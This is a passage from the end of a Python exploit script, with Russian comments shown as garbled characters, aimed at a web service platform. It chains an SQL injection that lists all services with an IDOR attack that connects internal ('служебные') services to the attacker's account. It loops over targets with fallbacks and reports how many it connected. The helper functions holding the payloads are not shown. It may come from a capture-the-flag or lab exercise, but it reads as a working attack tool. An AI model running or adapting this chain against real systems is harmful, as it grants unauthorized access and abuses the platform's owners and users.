        print("\n‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ email –∏ –ø–∞—Ä–æ–ª—å.")
        sys.exit(1)
    
    # –®–∞–≥ 1: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤—Å–µ—Ö —É—Å–ª—É–≥
    all_services = exploit_sqli_get_all_services(session)
    
    
    # –®–∞–≥ 2: –§–∏–ª—å—Ç—Ä—É–µ–º —Å–ª—É–∂–µ–±–Ω—ã–µ —É—Å–ª—É–≥–∏
    service_services = []
    for service in all_services:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞—Ç–µ–≥–æ—Ä–∏—é –∏–ª–∏ –Ω–∞–∑–≤–∞–Ω–∏–µ
        category_lower = service.get('category', '').lower()
        name_lower = service.get('name', '').lower()
        if '—Å–ª—É–∂–µ–±–Ω' in category_lower or '—Å–ª—É–∂–µ–±–Ω' in name_lower:
            service_services.append(service)
    
    print(f"\nüìä –ê–Ω–∞–ª–∏–∑ –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö —É—Å–ª—É–≥:")
    print(f"   ‚Ä¢ –í—Å–µ–≥–æ –Ω–∞–π–¥–µ–Ω–æ —É—Å–ª—É–≥: {len(all_services)}")
    print(f"   ‚Ä¢ –°–ª—É–∂–µ–±–Ω—ã—Ö —É—Å–ª—É–≥ (–ø–æ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏/–Ω–∞–∑–≤–∞–Ω–∏—é): {len(service_services)}")
    
    # –ï—Å–ª–∏ –Ω–∞—à–ª–∏ –º–µ–Ω—å—à–µ 8 —Å–ª—É–∂–µ–±–Ω—ã—Ö, –¥–æ–±–∞–≤–ª—è–µ–º —É—Å–ª—É–≥–∏ —Å –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π
    # (–æ–Ω–∏ –º–æ–≥—É—Ç –±—ã—Ç—å —Å–ª—É–∂–µ–±–Ω—ã–º–∏, –Ω–æ –Ω–µ –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å—Å—è —Å –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π –≤ HTML)
    if len(service_services) < 8:
        print(f"\n   ‚ö†Ô∏è –ù–∞–π–¥–µ–Ω–æ —Ç–æ–ª—å–∫–æ {len(service_services)} —Å–ª—É–∂–µ–±–Ω—ã—Ö —É—Å–ª—É–≥ (–æ–∂–∏–¥–∞–µ—Ç—Å—è 8)")
        print(f"   –î–æ–±–∞–≤–ª—è—é —É—Å–ª—É–≥–∏ —Å –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π –¥–ª—è –ø–æ–ø—ã—Ç–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...")
        unknown_services = [s for s in all_services if s.get('category') == '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ' and s not in service_services]
        if unknown_services:
            print(f"   –ù–∞–π–¥–µ–Ω–æ {len(unknown_services)} —É—Å–ª—É–≥ —Å –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π")
            service_services.extend(unknown_services)
            print(f"   –¢–µ–ø–µ—Ä—å –±—É–¥–µ—Ç –ø–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç—å {len(service_services)} —É—Å–ª—É–≥")
    
    # –ï—Å–ª–∏ —Å–ª—É–∂–µ–±–Ω—ã–µ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã, –ø—Ä–æ–±—É–µ–º –≤—Å–µ —É—Å–ª—É–≥–∏ —Å –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π
    if not service_services:
        print("\n‚ö†Ô∏è –°–ª—É–∂–µ–±–Ω—ã–µ —É—Å–ª—É–≥–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏")
        print("   –ë—É–¥—É –ø—Ä–æ–±–æ–≤–∞—Ç—å –ø–æ–¥–∫–ª—é—á–∞—Ç—å –≤—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ —É—Å–ª—É–≥–∏ —Å –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π...")
        service_services = [s for s in all_services if s.get('category') == '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ']
        print(f"   –ù–∞–π–¥–µ–Ω–æ —É—Å–ª—É–≥ —Å –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π: {len(service_services)}")
    
    # –ï—Å–ª–∏ –≤—Å–µ –µ—â–µ –Ω–µ—Ç, –ø—Ä–æ–±—É–µ–º –≤—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ —É—Å–ª—É–≥–∏ (–º–æ–∂–µ—Ç –±—ã—Ç—å –º–Ω–æ–≥–æ —Å–ª—É–∂–µ–±–Ω—ã—Ö)
    if not service_services:
        print("   ‚ö†Ô∏è –ù–µ –Ω–∞–π–¥–µ–Ω–æ —Å–ª—É–∂–µ–±–Ω—ã—Ö —É—Å–ª—É–≥, –ø—Ä–æ–±—É—é –ø–æ–¥–∫–ª—é—á–∏—Ç—å –≤—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ —É—Å–ª—É–≥–∏...")
        service_services = all_services
    
    if not service_services:
        print("   ‚ùå –ù–µ –Ω–∞–π–¥–µ–Ω–æ —É—Å–ª—É–≥ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è")
        print("   –ü–æ–∫–∞–∑—ã–≤–∞—é –≤—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ —É—Å–ª—É–≥–∏ –¥–ª—è —Ä—É—á–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏:")
        for service in all_services[:20]:
            print(f"   ‚Ä¢ {service['name']} (UUID: {service['uuid']}, –ö–∞—Ç–µ–≥–æ—Ä–∏—è: {service['category']})")
        return
    
    print(f"\nüìã –ë—É–¥–µ—Ç –ø–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç—å {len(service_services)} —É—Å–ª—É–≥")
    
    # –®–∞–≥ 3: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è IDOR –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —Å–ª—É–∂–µ–±–Ω—ã—Ö —É—Å–ª—É–≥
    print("\n" + "=" * 60)
    print("üîì –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è IDOR –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —Å–ª—É–∂–µ–±–Ω—ã—Ö —É—Å–ª—É–≥")
    print("=" * 60)
    
    connected_count = 0
    failed_count = 0
    
    for i, service in enumerate(service_services, 1):
        print(f"\nüìå [{i}/{len(service_services)}] –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {service['name']} ({service['uuid']})")
        if exploit_idor_connect_service(session, service['uuid'], service['name']):
            connected_count += 1
        else:
            failed_count += 1
        time.sleep(0.3)  # –ù–µ–±–æ–ª—å—à–∞—è –ø–∞—É–∑–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
    
    # –ò—Ç–æ–≥–∏
    print("\n" + "=" * 60)
    print("‚úÖ –ì–æ—Ç–æ–≤–æ!")
    print(f"üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:")
    print(f"   ‚Ä¢ –í—Å–µ–≥–æ –Ω–∞–π–¥–µ–Ω–æ —É—Å–ª—É–≥: {len(all_services)}")
    print(f"   ‚Ä¢ –ü–æ–ø—ã—Ç–æ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {len(service_services)}")
    print(f"   ‚Ä¢ –£—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ: {connected_count}")
    print(f"   ‚Ä¢ –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å: {failed_count}")
    
    if connected_count > 0:
        print(f"\nüéâ –£—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ {connected_count} —Å–ª—É–∂–µ–±–Ω—ã—Ö —É—Å–ª—É–≥!")
        print(f"üîó –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–µ —É—Å–ª—É–≥–∏: {BASE_URL}/my-services/")
    else:
        print(f"\n‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å –Ω–∏ –æ–¥–Ω–æ–π —É—Å–ª—É–≥–∏")
        print(f"   –í–æ–∑–º–æ–∂–Ω–æ, –Ω—É–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å SQL payload –∏–ª–∏ –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞")
    
    print("=" * 60)

if __name__ == "__main__":
    main()
